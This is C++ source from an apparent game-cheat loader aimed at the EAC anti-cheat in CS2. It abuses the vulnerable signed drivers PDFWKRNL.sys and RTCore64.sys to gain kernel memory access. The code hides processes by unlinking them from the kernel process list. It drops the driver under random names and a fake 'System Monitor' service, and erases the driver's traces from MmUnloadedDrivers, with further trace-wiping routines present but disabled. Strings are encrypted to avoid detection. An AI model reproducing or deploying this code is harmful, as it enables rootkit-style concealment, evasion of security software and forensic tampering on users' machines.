        // ★ BUILD 567 v3.235: 使用 WriteUnsafe (EPROCESS 可能在非分页池扩展区域)
        ByovdDiag("DKOM.HideByPid: SelfLoopHarden FAIL — rolling back PerformUnlink (pid=%u)\n", pid);
        uint64_t currentLinksVA = eproc + m_linksOffset;
        kma.WriteUnsafe(entry->flinkBackup + 8, currentLinksVA);  // next.Blink = &current (恢复)
        kma.WriteUnsafe(entry->blinkBackup, currentLinksVA);      // prev.Flink = &current (恢复)
        entry->eprocess    = 0;
        entry->flinkBackup = 0;
        entry->blinkBackup = 0;
        return false;
    }

    entry->hidden = true;
    ByovdDiag("DKOM.HideByPid: SUCCESS pid=%u EPROC=0x%llX hidden=%d\n",
        pid, (unsigned long long)eproc, entry->hidden ? 1 : 0);
    return true;
}

// ============================================================
// ★ BUILD 544: UnhideProcessByPid — 取消隐藏指定 PID
//   复用 BUILD 541 链表一致性检查 + 自循环回退逻辑
//
//   根因 (BUILD 541): HideProcess 后 prev→next (current 被断链). 运行期间若有新进程 C 创建,
//     内核将 C 插入到 prev 和 next 之间 → prev→C→next.
//     原逻辑写 prev->Flink=&current, next->Blink=&current,
//     覆盖了 C 的链表项 → C 变成"悬空"节点 → C 退出时 RemoveEntryList 检查失败 → 0x139.
//
//   修复: UnhideProcessByPid 时先检查链表是否被修改:
//     1. 读取 prev->Flink 和 next->Blink 当前值
//     2. 若 prev->Flink==m_flinkBackup(原next) 且 next->Blink==m_blinkBackup(原prev),
//        链表未被修改 → 使用原逻辑恢复 (写 prev->Flink=&current, next->Blink=&current)
//     3. 若链表被修改 (有新进程 C 插入) → 使用"自循环"回退:
//        写 current->Flink=&current, current->Blink=&current (不修改 prev/next)
//        自循环安全性: RemoveEntryList(&current) 检查
//          current->Blink->Flink == current->Flink == &current ✓
//          current->Flink->Blink == current->Blink == &current ✓
//        检查通过, 不会 0x139. 且不破坏 C 的链表项.
// ============================================================
bool DKOMProcessHider::UnhideProcessByPid(DWORD pid) {
    auto& kma = KernelMemoryAccessor::Instance();
    if (!kma.IsActive()) return false;

    // 查找条目
    HiddenEntry* entry = nullptr;
    for (size_t i = 0; i < MAX_HIDDEN; i++) {
        if (m_hiddenList[i].hidden && m_hiddenList[i].pid == pid) {
            entry = &m_hiddenList[i];
            break;
        }
    }
    if (!entry) {
        // 未隐藏, 无需 Unhide (no-op)
        return false;
    }

    if (m_linksOffset == 0) {
        ByovdDiag("DKOM.UnhideByPid: FAIL m_linksOffset=0 (pid=%u, HideProcess never succeeded)\n", pid);
        return false;
    }

    uint64_t currentLinksVA = entry->eprocess + m_linksOffset;

    // ★ BUILD 567 v3.277 FIX: 永远用 self-loop, 不碰邻居进程 — 避免 0x50 蓝屏
    //   v3.276 测试: 关闭 CS2 蓝屏 0x50 in SysDrv_34C7.sys (BYOVD driver)
    //   根因: listIntact 分支写入 prev/next 邻居 EPROCESS, 如果邻居进程已退出,
    //         EPROCESS 被释放 → driver 写入已释放内核内存 → 0x50
    //   修复: 永远用 self-loop (只写 current 自己的 EPROCESS, 保证有效)
    //   安全性: loader.exe 退出时 PspExitProcess 调用 RemoveEntryList,
    //           self-loop (Flink=Blink=&current) 时 RemoveEntryList 是 no-op:
    //             Flink->Blink = Blink → current->Blink = &current (no-op)
    //             Blink->Flink = Flink → current->Flink = &current (no-op)
    //           不碰邻居进程, 不会 0x139 也不会 0x50.
    //   副作用: loader.exe 不重新加入 ActiveProcessLinks (保持隐藏状态直到退出),
    //           但 CS2 已退出, 无需被枚举.
    // ★ BUILD 567 v3.235: 使用 WriteUnsafe (EPROCESS 可能在非分页池扩展区域)
    bool w1 = kma.WriteUnsafe(currentLinksVA,     currentLinksVA);  // current->Flink = &current (self-loop)
    bool w2 = kma.WriteUnsafe(currentLinksVA + 8, currentLinksVA);  // current->Blink = &current (self-loop)

    ByovdDiag("DKOM.UnhideByPid: self-loop (v3.277 always) w1(Flink)=%d w2(Blink)=%d "
              "(pid=%u EPROC=0x%llX currentLinks=0x%llX)\n",
        w1?1:0, w2?1:0, pid,
        (unsigned long long)entry->eprocess, (unsigned long long)currentLinksVA);

    entry->hidden = false;
    entry->eprocess = 0;
    entry->flinkBackup = 0;
    entry->blinkBackup = 0;
    return (w1 && w2);
}

// ============================================================
// ★ BUILD 544: UnhideAll — 取消隐藏所有已隐藏进程
//   进程退出前必须调用 — 任一隐藏进程未挂回都会在退出时触发 0x139 蓝屏
// ============================================================
void DKOMProcessHider::UnhideAll() {
    ByovdDiag("DKOM.UnhideAll: starting (scanning %d slots)\n", (int)MAX_HIDDEN);
    int unhiddenCount = 0;
    for (size_t i = 0; i < MAX_HIDDEN; i++) {
        if (m_hiddenList[i].hidden) {
            DWORD pid = m_hiddenList[i].pid;
            ByovdDiag("DKOM.UnhideAll: unhiding pid=%u (slot %zu, EPROC=0x%llX)\n",
                pid, i, (unsigned long long)m_hiddenList[i].eprocess);
            if (UnhideProcessByPid(pid)) {
                unhiddenCount++;
            } else {
                ByovdDiag("DKOM.UnhideAll: FAIL unhiding pid=%u\n", pid);
            }
        }
    }
    ByovdDiag("DKOM.UnhideAll: done (%d processes unhidden)\n", unhiddenCount);
}

// ============================================================
// KernelDefense — 一体化编排
// ============================================================

// ============================================================
// v3.33 Method 3: 驱动 PE 头变异 + 随机化服务名
//
// RTCore64.sys 的 SHA256 被 EAC 黑名单收录,
// 直接加载会被驱动签名/哈希扫描检测
//
// 策略:
//   1. 复制驱动到 %TEMP%\XXXX.sys (随机名)
//   2. 修改 PE 头: Timestamp 随机化 + CheckSum 重算
//   3. 注册为随机服务名 "SysMonXXXX"
//
// 效果: 每次运行驱动文件名+服务名+PE header 均不同,
//       EAC 黑名单按固定签名/哈希匹配 → 失效
// ============================================================
static BYOVDDriverInfo MutateAndRandomizeDriver(const BYOVDDriverInfo& original) {
    // ★ v3.96: 不再修改驱动二进制 — 任何 PE 修改 (设备名补丁/签名剥离/时间戳)
    //   都会触发 Windows 内核的 STATUS_INVALID_IMAGE_HASH (0xC0000428)。
    //   改为使用原始未修改驱动 + 原始设备名,
    //   通过 SCM 清理 + DefineDosDeviceW 修复僵尸设备来避免冲突。
    //
    //   仅随机化服务名 (注册表唯一性), 驱动内容保持原样。
    // ★ BUILD 489: 支持 PDFWKRNL.sys (设备名 \\.\PdfwKrnl)

    // 生成 4 位随机 hex 标识符
    WORD seed = (WORD)(GetTickCount() ^ (GetCurrentProcessId() & 0xFFFF) ^ GetCurrentThreadId());
    wchar_t randomHex[16] = {};
    wsprintfW(randomHex, L"%04X", seed);

    // 生成随机文件名: SysDrv_XXXX.sys
    wchar_t randomName[64] = {};
    wsprintfW(randomName, L"SysDrv_%s.sys", randomHex);

    wchar_t tempPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);
    wcscat_s(tempPath, randomName);

    // ★ 获取嵌入的原始驱动数据 (完全不修改)
    // ★ BUILD 550: 解密驱动文件名 (原 L"RTCore64.sys"/L"PDFWKRNL.sys" 明文)
    // ★ BUILD 550: RTCore64.sys 分支已移除 (死代码, g_driverCandidates[] 仅 PDFWKRNL)
    const uint8_t* embedData = nullptr;
    size_t embedSize = 0;
    {
        wchar_t wPDFWsys[32];
        STEALTH_WSTR_DECRYPT_TO("PDFWKRNL.sys", wPDFWsys, 32);
        if (wcscmp(original.driverPath, wPDFWsys) == 0) {
            // ★ BUILD 489: PDFWKRNL.sys 嵌入支持
            embedData = stealth::embedded::PDFWKRNL_data;
            embedSize = stealth::embedded::PDFWKRNL_size;
        }
    }
    ByovdDiag("BYOVD:Mutate: embedData=0x%p embedSize=%zu\n", embedData, embedSize);

    if (!embedData || embedSize == 0 || embedSize > 100 * 1024 * 1024) {
        ByovdDiag("BYOVD:Mutate: no embedded data, falling back to file system\n");
        // 回退到文件系统
        // ★ BUILD 497: 固定数组替代 std::wstring — 避免 CRT 堆依赖
        wchar_t srcPath[MAX_PATH] = {};
        {
            wchar_t sysDir[MAX_PATH];
            GetSystemDirectoryW(sysDir, MAX_PATH);
            wcscat_s(sysDir, L"\\drivers\\");
            wcscat_s(sysDir, original.driverPath);
            if (GetFileAttributesW(sysDir) == INVALID_FILE_ATTRIBUTES) {
                wcscpy_s(srcPath, original.driverPath);
            } else {
                wcscpy_s(srcPath, sysDir);
            }
        }
        HANDLE hSrc = CreateFileW(srcPath, GENERIC_READ, FILE_SHARE_READ,
            nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hSrc == INVALID_HANDLE_VALUE) return original;
        DWORD fileSize = GetFileSize(hSrc, nullptr);
        if (fileSize < 0x200 || fileSize > 100 * 1024 * 1024) { CloseHandle(hSrc); return original; }
        // ★ v3.120: VirtualAlloc 替代 std::vector — 避免 CRT 堆依赖
        uint8_t* driverData = (uint8_t*)VirtualAlloc(nullptr, fileSize, MEM_COMMIT, PAGE_READWRITE);
        if (!driverData) { CloseHandle(hSrc); return original; }
        DWORD bytesRead = 0;
        ReadFile(hSrc, driverData, fileSize, &bytesRead, nullptr);
        CloseHandle(hSrc);
        if (bytesRead != fileSize) { VirtualFree(driverData, 0, MEM_RELEASE); return original; }

        HANDLE hOut = CreateFileW(tempPath, GENERIC_WRITE, 0, nullptr,
            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hOut == INVALID_HANDLE_VALUE) { VirtualFree(driverData, 0, MEM_RELEASE); return original; }
        DWORD bytesWritten = 0;
        WriteFile(hOut, driverData, fileSize, &bytesWritten, nullptr);
        CloseHandle(hOut);
        VirtualFree(driverData, 0, MEM_RELEASE);
        if (bytesWritten != fileSize) return original;
    } else {
        // 直接写入原始嵌入数据
        HANDLE hOut = CreateFileW(tempPath, GENERIC_WRITE, 0, nullptr,
            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hOut == INVALID_HANDLE_VALUE) return original;
        DWORD bytesWritten = 0;
        WriteFile(hOut, embedData, (DWORD)embedSize, &bytesWritten, nullptr);
        CloseHandle(hOut);
        if (bytesWritten != embedSize) {
            ByovdDiag("BYOVD:Mutate: WriteFile FAILED (wrote %u/%zu)\n", bytesWritten, embedSize);
            return original;
        }
        ByovdDiag("BYOVD:Mutate: wrote original driver %u bytes to %ls\n", bytesWritten, tempPath);
    }

    // ★ BUILD 470: 不修改二进制 — patching 破坏签名导致 0xC0000428
    //   策略改为复用已有驱动 (Init probing) + 不卸载 (Shutdown skip unload)

    if (GetFileAttributesW(tempPath) == INVALID_FILE_ATTRIBUTES) return original;

    // 构建驱动信息: 使用原始设备名 \\.\RTCore64 (驱动内部硬编码)
    BYOVDDriverInfo mutated;
    // ★ BUILD 501: 固定数组用 wcscpy_s 替代 operator= — 避免 CRT 堆依赖
    wcscpy_s(mutated.devicePath, original.devicePath);     // ★ 保持原始 \\.\RTCore64
    mutated.ioctlCode = original.ioctlCode;
    mutated.needsMemoryMap = original.needsMemoryMap;
    wcscpy_s(mutated.driverPath, tempPath);

    wchar_t svcName[64] = {};
    wsprintfW(svcName, L"SysMon%s", randomHex);
    wcscpy_s(mutated.serviceName, svcName);
    wchar_t dspName[64] = {};
    wsprintfW(dspName, L"System Monitor %s", randomHex);
    wcscpy_s(mutated.displayName, dspName);

    ByovdDiag("BYOVD:Mutate: device=%ls svc=%ls path=%ls\n",
        mutated.devicePath, mutated.serviceName, mutated.driverPath);

    return mutated;
}

// ============================================================
// ★ v3.126m: KernelTraceCleaner — 清理 BYOVD 驱动加载/卸载痕迹
//
// Windows 内核在驱动程序加载和卸载时在以下结构中留下可取证痕迹:
//
//   1. MmUnloadedDrivers[50] (ntoskrnl.exe)
//      格式: RTL_UNLOADED_MODULE_DRIVER[50] 循环数组
//      每项含: UNICODE_STRING Name (驱动路径/名)
//      反作弊扫描: 遍历查找已知漏洞驱动 (RTCore64.sys, gdrv.sys 等)
//
//   2. PiDDBCacheTable (ntoskrnl.exe)
//      格式: RTL_AVL_TABLE (平衡二叉树)
//      每项含: UNICODE_STRING DriverName, LARGE_INTEGER TimeDateStamp
//      反作弊扫描: 遍历查找已知漏洞驱动的哈希/时间戳
//
//   3. g_KernelHashBucketList (ci.dll — Code Integrity)
//      格式: 哈希桶链表 (内核代码完整性缓存)
//      每项含: 驱动哈希值, 证书信息
//      反作弊扫描: 部分 AC 也会扫描 ci.dll 内部结构
//
// 策略: 使用 BYOVD 内核 R/W 直接遍历/修改这些结构,
//       移除/清零所有包含 "RTCore64" 的条目
// ============================================================

// === 内核数据结构定义 (x64) ===
// ★ v3.126m-review: 修复 — 移除 pack(1), 内核使用自然 8 字节对齐
//   pack(1) 导致 RTL_BALANCED_LINKS 被压为 28 字节, 而内核实际是 32 字节
//   这会级联导致所有后续字段偏移错误 4 字节, 写入时损坏 AVL Balance → BSOD

// RTL_BALANCED_LINKS — 内核实际布局 (sizeof=0x20=32)
struct KernRTL_BALANCED_LINKS {
    uint64_t Parent;        // +0x00
    uint64_t LeftChild;     // +0x08
    uint64_t RightChild;    // +0x10
    uint8_t  Balance;       // +0x18 (CHAR, -1/0/+1)
    uint8_t  Reserved[3];   // +0x19 (padding to 8-byte boundary)
    uint32_t IsLeftChild;   // +0x1C (BOOLEAN but padded to 4 bytes)
};

// RTL_AVL_TABLE — 内核实际布局 (sizeof=0x78=120)
struct KernRTL_AVL_TABLE {
    KernRTL_BALANCED_LINKS BalancedRoot;  // +0x00 (32 bytes)
    uint64_t OrderedPointer;              // +0x20
    uint32_t WhichOrderedElement;         // +0x28
    uint32_t NumberGenericTableElements;  // +0x2C
    uint32_t DepthOfTree;                 // +0x30
    // padding to 0x78
};

// PiDDBCacheTable 条目 — 内核实际布局
//   +0x00: RTL_BALANCED_LINKS Links (32 bytes → 到 +0x20)
//   +0x20: UNICODE_STRING  DriverName (16 bytes)
//   +0x30: LARGE_INTEGER   TimeDateStamp (8 bytes)
struct KernPiDDBCacheEntry {
    KernRTL_BALANCED_LINKS Links;         // +0x00 (32 bytes)
    uint16_t DriverNameLength;            // +0x20 (UNICODE_STRING.Length)
    uint16_t DriverNameMaxLength;         // +0x22 (UNICODE_STRING.MaximumLength)
    uint32_t Padding;                     // +0x24 (padding)
    uint64_t DriverNameBuffer;            // +0x28 (UNICODE_STRING.Buffer → 内核池 PWSTR)
    uint64_t TimeDateStamp;               // +0x30
};

// MmUnloadedDrivers 扫描参数
static const int MM_UNLOADED_MAX      = 50;    // 最多记录 50 条
static const int MM_UNLOADED_ENTRY_SZ = 0x68;  // Win10/11 RTL_UNLOADED_MODULE_DRIVER 大小

// === 辅助: 从内核池地址读取 Unicode 字符串 (Buffer 在内核池中) ===
// ★ BUILD 497: 固定缓冲区替代 std::wstring 返回值 — 避免 CRT 堆依赖
//   返回 outBuf 中实际写入的字符数 (不含 null terminator)
static int ReadKernelUnicodeString(uint64_t poolAddr, uint16_t lenBytes, wchar_t* outBuf, int outBufChars) {
    auto& kma = KernelMemoryAccessor::Instance();
    if (!poolAddr || !lenBytes || !outBuf || outBufChars <= 0) { outBuf[0] = 0; return 0; }

    uint16_t chars = lenBytes / 2;
    if (chars > (uint16_t)(outBufChars - 1)) chars = (uint16_t)(outBufChars - 1); // 安全限制

    if (kma.ReadKernelVA(poolAddr, outBuf, chars * 2)) {
        outBuf[chars] = 0;
        return chars;
    }
    outBuf[0] = 0;
    return 0;
}

// === 目标驱动名列表 — 需要从痕迹表中清除 ===
// ★ BUILD 550: 改为运行时解密 (原 L"RTCore64.sys"/L"RTCore64" 明文)
static const wchar_t* const* GetTraceTargetNames() {
    static wchar_t names[4][32] = {};
    static const wchar_t* namePtrs[5] = {};
    static bool initialized = false;
    if (!initialized) {
        STEALTH_WSTR_DECRYPT_TO("RTCore64.sys", names[0], 32);
        STEALTH_WSTR_DECRYPT_TO("RTCore64", names[1], 32);
        // names[2], names[3] 保持全零 (终止符缓冲)
        for (int i = 0; i < 4; i++) namePtrs[i] = names[i];
        namePtrs[4] = nullptr;
        initialized = true;
    }
    return namePtrs;
}

// ★ BUILD 497: 固定数组替代 std::wstring — 避免 CRT 堆依赖
static bool IsTraceTarget(const wchar_t* name) {
    // ★ v3.126m-review: 修复 — 精确匹配 (wcsstr 包含匹配已足够, 但不误伤)
    //   只匹配全名中包含 RTCore64.sys 或 RTCore64 的条目
    // ★ BUILD 550: 改用 GetTraceTargetNames() (原 g_traceTargetNames 明文已加密)
    const wchar_t* const* targets = GetTraceTargetNames();
    for (int i = 0; targets[i]; i++) {
        if (wcsstr(name, targets[i]) != nullptr)
            return true;
    }
    return false;
}

// ============================================================
// 1. ClearMmUnloadedDrivers — 清除 MmUnloadedDrivers 数组
// ============================================================
bool KernelTraceCleaner::ClearMmUnloadedDrivers(uint64_t ntosBase) {
    auto& kma = KernelMemoryAccessor::Instance();
    ByovdDiag("TRACE:MmUnloadedDrivers: starting, ntos=0x%llX\n", (unsigned long long)ntosBase);

    // 策略: 在 IoDeleteDriver 函数中扫描 LEA 指令定位 MmUnloadedDrivers 全局变量
    //   典型指令序列 (Win10/11 x64):
    //     48 8D 0D XX XX XX XX    lea rcx, [MmUnloadedDrivers]
    //     48 8D 15 XX XX XX XX    lea rdx, [MmLastUnloadedDriver]
    //   MmUnloadedDrivers = RIP(下一条指令) + rel32
    // ★ BUILD 555 P2-verify: STEALTH_STR_DECRYPT_TO 加密 IoDeleteDriver
    char ioDeleteDriverName[32] = {};
    STEALTH_STR_DECRYPT_TO("IoDeleteDriver", ioDeleteDriverName, sizeof(ioDeleteDriverName));
    uint64_t ioDeleteDriver = kma.ResolveExport(ntosBase, ioDeleteDriverName);
    if (!ioDeleteDriver) {
        ByovdDiag("TRACE:MmUnloadedDrivers: IoDeleteDriver not found\n");
        return false;
    }

    // 读取 IoDeleteDriver 前 512 字节 (函数体)
    uint8_t funcBytes[512] = {};
    if (!kma.ReadKernelVA(ioDeleteDriver, funcBytes, sizeof(funcBytes))) {
        ByovdDiag("TRACE:MmUnloadedDrivers: failed to read IoDeleteDriver body\n");
        return false;
    }

    uint64_t mmUnloadedAddr = 0;
    for (int i = 0; i < 500; i++) {
        // 48 8D 0D = LEA RCX, [RIP + rel32]
        if (funcBytes[i] == 0x48 && funcBytes[i+1] == 0x8D && funcBytes[i+2] == 0x0D) {
            int32_t rel32 = *(int32_t*)(funcBytes + i + 3);
            uint64_t candidate = ioDeleteDriver + i + 7 + rel32;
            // 验证: 候选地址应在 ntoskrnl 范围内
            if (candidate > ntosBase && candidate < ntosBase + 0x2000000) {
                mmUnloadedAddr = candidate;
                ByovdDiag("TRACE:MmUnloadedDrivers: found at offset +%d, addr=0x%llX\n",
                    i, (unsigned long long)mmUnloadedAddr);
                break;
            }
        }
    }

    if (!mmUnloadedAddr) {
        ByovdDiag("TRACE:MmUnloadedDrivers: array not found in IoDeleteDriver\n");
        return false;
    }

    // 读取整个数组并扫描 RTCore64 条目
    int cleared = 0;
    for (int idx = 0; idx < MM_UNLOADED_MAX; idx++) {
        uint64_t entryAddr = mmUnloadedAddr + (uint64_t)(idx * MM_UNLOADED_ENTRY_SZ);
        uint8_t entryBytes[MM_UNLOADED_ENTRY_SZ] = {};

        if (!kma.ReadKernelVA(entryAddr, entryBytes, MM_UNLOADED_ENTRY_SZ))
            continue;

        // UNICODE_STRING 在 entry 开头 (offset 0): Length(2), MaxLength(2), Buffer(8)
        uint16_t nameLen = *(uint16_t*)(entryBytes);
        uint64_t nameBuf = *(uint64_t*)(entryBytes + 8);

        if (!nameLen || !nameBuf || nameLen > 256)
            continue;
        // ★ v3.296 FIX-15: 验证 nameBuf 在内核白名单内 (防止读取未映射页)
        //   MmUnloadedDrivers 条目的 Buffer 应在非分页池, 但防御性验证.
        if (nameBuf < 0xFFFF800000000000ULL || nameBuf >= 0xFFFFFD0000000000ULL)
            continue;

        wchar_t name[256] = {};
        int nchars = ReadKernelUnicodeString(nameBuf, nameLen, name, 256);
        if (nchars == 0) continue;

        if (IsTraceTarget(name)) {
            ByovdDiag("TRACE:MmUnloadedDrivers: [%d] found '%ls' → clearing\n", idx, name);
            // 清零 UNICODE_STRING (16 字节: Length+MaxLength+Buffer+Reserved)
            uint8_t zeros[16] = {};
            kma.WriteKernelVA(entryAddr, zeros, 16);
            cleared++;
        }
    }

    ByovdDiag("TRACE:MmUnloadedDrivers: done, cleared %d entries\n", cleared);
    return (cleared > 0);
}

// ============================================================
// 2. ClearPiDDBCacheTable — 清除 PiDDBCacheTable AVL 树
// ============================================================

// 递归遍历 AVL 树并清除匹配条目
static int TraverseAndClearPiDDBAVL(uint64_t nodeAddr, int depth) {
    if (!nodeAddr || depth > 30) return 0; // 安全: 深度上限防止无限递归

    auto& kma = KernelMemoryAccessor::Instance();
    KernPiDDBCacheEntry entry = {};
    if (!kma.ReadKernelVA(nodeAddr, &entry, sizeof(entry)))
        return 0;

    int cleared = 0;

    // 先递归左子树
    if (entry.Links.LeftChild) {
        cleared += TraverseAndClearPiDDBAVL(entry.Links.LeftChild, depth + 1);
    }
    // 再递归右子树  
    if (entry.Links.RightChild) {
        cleared += TraverseAndClearPiDDBAVL(entry.Links.RightChild, depth + 1);
    }

    // 处理当前节点
    // ★ v3.296 FIX-15: 验证 DriverNameBuffer 在内核白名单内
    if (entry.DriverNameLength > 0 && entry.DriverNameLength <= 256 && entry.DriverNameBuffer &&
        entry.DriverNameBuffer >= 0xFFFF800000000000ULL && entry.DriverNameBuffer < 0xFFFFFD0000000000ULL) {
        wchar_t name[256] = {};
        int nchars = ReadKernelUnicodeString(entry.DriverNameBuffer, entry.DriverNameLength, name, 256);
        if (nchars > 0 && IsTraceTarget(name)) {
            ByovdDiag("TRACE:PiDDBCache: found '%ls' (stamp=0x%llX) at depth=%d\n",
                name, (unsigned long long)entry.TimeDateStamp, depth);
            // 清零节点: 清除 DriverName UNICODE_STRING 和 TimeDateStamp
            //  不能删除 AVL 节点 (需要重新平衡树, 风险大), 改为使其不可识别
            //  写入 NULL Buffer 和零 Length, Name 变为空字符串
            //  ★ v3.126m-review: 偏移修正 — UNICODE_STRING 在 +0x20 (不是 +0x18)
            uint64_t fieldAddr = nodeAddr + 0x20; // UNICODE_STRING 起始
            uint8_t zeros[24] = {}; // 覆盖 Length(2)+Max(2)+pad(4)+Buffer(8)+TimeDateStamp(8)
            kma.WriteKernelVA(fieldAddr, zeros, sizeof(zeros));
            cleared++;
        }
    }

    return cleared;
}

bool KernelTraceCleaner::ClearPiDDBCacheTable(uint64_t ntosBase) {
    ByovdDiag("TRACE:PiDDBCacheTable: DISABLED (BUILD 454) — heuristic AVL scan too risky\n");
    return false;
    /* ── v3.129: 禁用 — 24MB ntoskrnl 启发式扫描 + 硬编码偏移写零 → BSOD 风险 ──
    auto& kma = KernelMemoryAccessor::Instance();
    ByovdDiag("TRACE:PiDDBCacheTable: starting, ntos=0x%llX\n", (unsigned long long)ntosBase);

    // 策略: 扫描 ntoskrnl .data 段寻找 PiDDBCacheTable AVL 树
    //   PiDDBCacheTable 位于 PiDDBLock (ERESOURCE) 附近
    //   常见模式: PiDDBLock + 0x80 = PiDDBCacheTable (Win10 21H2+)
    //   备选: 在 CipInitialize 或 PiUpdateDriverDBCache 中查找引用
    //
    //   更可靠的方案: 在 ntoskrnl 的非分页数据段中扫描 AVL 树特征
    //   特征: Root.Parent → NTOS base + 大偏移, NumberGenericTableElements > 0
    //   这里使用简化的地址范围扫描

    // 获取 ntoskrnl 大小以便限制扫描范围
    MODULEINFO modInfo = {};
    HMODULE hNtos = stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntoskrnl.exe"));
    if (!hNtos) {
        // 获取失败, 使用 EnumDeviceDrivers
        LPVOID drivers[256] = {};
        DWORD needed = 0;
        if (EnumDeviceDrivers(drivers, sizeof(drivers), &needed)) {
            for (DWORD i = 0; i < needed / sizeof(LPVOID); i++) {
                wchar_t name[MAX_PATH] = {};
                GetDeviceDriverBaseNameW(drivers[i], name, MAX_PATH);
                // ★ BUILD 550: 解密内核模块名 (原 L"ntoskrnl.exe" 明文)
                wchar_t wNtos[32];
                STEALTH_WSTR_DECRYPT_TO("ntoskrnl.exe", wNtos, 32);
                if (_wcsicmp(name, wNtos) == 0) {
                    hNtos = (HMODULE)drivers[i];
                    break;
                }
            }
        }
    }

    // 扫描 ntoskrnl .data 段 (基址 + 0x100000 ~ 基址 + 0x200000 大致范围)
    //  寻找 AVL 树: 结构体 0x78 字节, Root.LeftChild/Root.RightChild 非零
    //  且 NumberGenericTableElements > 0 且 < 1000 (缓存表通常有几十到几百条)
    uint64_t scanStart = ntosBase + 0x800000;  // .data 段大致起始
    uint64_t scanEnd   = ntosBase + 0x2000000; // 上限定为 32MB 内
    uint64_t foundTable = 0;

    // 内存映射扫描: 每次读取 64KB 块
    // ★ BUILD 497: VirtualAlloc 替代 std::vector — 避免 CRT 堆依赖
    uint8_t* chunk = (uint8_t*)VirtualAlloc(nullptr, 0x10000, MEM_COMMIT, PAGE_READWRITE);
    if (!chunk) return false;
    for (uint64_t addr = scanStart; addr < scanEnd; addr += 0x10000) {
        if (!kma.ReadKernelVA(addr, chunk, 0x10000))
            continue;

        for (size_t off = 0; off < 0x10000 - 0x78; off += 8) {
            KernRTL_AVL_TABLE* table = (KernRTL_AVL_TABLE*)(chunk + off);
            uint64_t actualAddr = addr + off;

            // 验证 AVL 表头:
            //   1. Root.Parent 应指向 ntoskrnl 基址附近
            //   2. NumberGenericTableElements 在合理范围 (1-1000)
            //   3. DepthOfTree 在合理范围 (1-20)
            //   4. Root.LeftChild 或 Root.RightChild 非零 (非空树)
            uint32_t count = table->NumberGenericTableElements;
            uint32_t depth = table->DepthOfTree;

            if (count >= 1 && count <= 1000 && depth >= 1 && depth <= 20) {
                uint64_t parentAddr = table->BalancedRoot.Parent;
                if (parentAddr > ntosBase && parentAddr < ntosBase + 0x2000000) {
                    // 父节点的根指针有意义
                    if (table->BalancedRoot.LeftChild || table->BalancedRoot.RightChild) {
                        foundTable = actualAddr;
                        ByovdDiag("TRACE:PiDDBCacheTable: candidate at 0x%llX (elements=%u depth=%u)\n",
                            (unsigned long long)foundTable, count, depth);
                        break;
                    }
                }
            }
        }
        if (foundTable) break;
    }

    // 备选: 如果扫描没找到, 尝试搜索 PiDDBLock 附近的 AVL 表
    if (!foundTable) {
        ByovdDiag("TRACE:PiDDBCacheTable: scan not found, trying PiDDBLock proximity...\n");
        // PiDDBLock 在 ntoskrnl data 段, 是一个 ERESOURCE 结构
        // 特征: OwnerTable = 0, ActiveCount = 0, ContentionCount = 0
        // 且通常前后有合法的内核地址
        for (uint64_t addr = scanStart; addr < scanEnd; addr += 0x1000) {
            if (!kma.ReadKernelVA(addr, chunk, 0x1000))
                continue;
            for (size_t off = 0; off < 0x1000 - 0x100; off += 8) {
                // 查找可能的 AVL 表: 扫描表头 0x78 字节后的区域
                // PiDDBLock + 0x80 处常有 0 的 ERESOURCE 和 AVL 表
                KernRTL_AVL_TABLE* table = (KernRTL_AVL_TABLE*)(chunk + off);
                if (table->NumberGenericTableElements >= 1 &&
                    table->NumberGenericTableElements <= 500 &&
                    table->DepthOfTree >= 1 && table->DepthOfTree <= 20) {
                    uint64_t actualAddr = addr + off;
                    uint64_t rootNode = 0;
                    // RTL_AVL_TABLE.BalancedRoot 是内嵌的 links,
                    //   RTL_BALANCED_LINKS 本身不直接指向节点,
                    //   而是节点的左/右孩子
                    // 查看是否有有效的子节点
                    uint8_t rootBytes[sizeof(KernRTL_AVL_TABLE)] = {};
                    if (kma.ReadKernelVA(actualAddr, rootBytes, sizeof(rootBytes))) {
                        auto* rt = (KernRTL_AVL_TABLE*)rootBytes;
                        if (rt->BalancedRoot.LeftChild || rt->BalancedRoot.RightChild) {
                            foundTable = actualAddr;
                            ByovdDiag("TRACE:PiDDBCacheTable: found via proximity at 0x%llX\n",
                                (unsigned long long)foundTable);
                            break;
                        }
                    }
                }
            }
            if (foundTable) break;
        }
    }

    if (!foundTable) {
        ByovdDiag("TRACE:PiDDBCacheTable: table not found\n");
        VirtualFree(chunk, 0, MEM_RELEASE);
        return false;
    }

    // 读取 AVL 表的根节点并开始遍历
    KernRTL_AVL_TABLE table = {};
    if (!kma.ReadKernelVA(foundTable, &table, sizeof(table))) {
        VirtualFree(chunk, 0, MEM_RELEASE);
        return false;
    }

    // 根节点的 "LeftChild" 实际上是整个树的根
    // RTL_AVL_TABLE.BalancedRoot.LeftChild → 树根
    uint64_t treeRoot = table.BalancedRoot.LeftChild;
    if (!treeRoot) {
        // 备选: Parent 也可能是根
        treeRoot = table.BalancedRoot.Parent;
    }

    int cleared = 0;
    if (treeRoot) {
        cleared = TraverseAndClearPiDDBAVL(treeRoot, 0);
    } else {
        ByovdDiag("TRACE:PiDDBCacheTable: empty tree (root=0)\n");
    }

    ByovdDiag("TRACE:PiDDBCacheTable: done, cleared %d entries, table had %u elements\n",
        cleared, table.NumberGenericTableElements);
    VirtualFree(chunk, 0, MEM_RELEASE);
    return (cleared > 0);
    ── v3.129 end ── */
}

// ============================================================
// 3. ClearCiHashBucket — 清除 ci.dll KernelHashBucketList
// ============================================================
bool KernelTraceCleaner::ClearCiHashBucket(uint64_t ciBase) {
    ByovdDiag("TRACE:CiHashBucket: DISABLED (BUILD 453) — heuristic scan too risky\n");
    return false;
    /* ── v3.128: 禁用 — 启发式扫描 ci.dll 数据段 + 写零导致 BSOD ──
    auto& kma = KernelMemoryAccessor::Instance();
    ByovdDiag("TRACE:CiHashBucket: starting, ci.dll=0x%llX\n", (unsigned long long)ciBase);

    if (!ciBase) {
        ByovdDiag("TRACE:CiHashBucket: ci.dll not loaded, skip\n");
        return false;
    }

    // ci.dll 的 g_KernelHashBucketList 是一个哈希桶链表
    //   位于 ci.dll 的 .data 段, 具体偏移未知
    //   每个桶条目包含: 驱动哈希, 证书链, 文件名
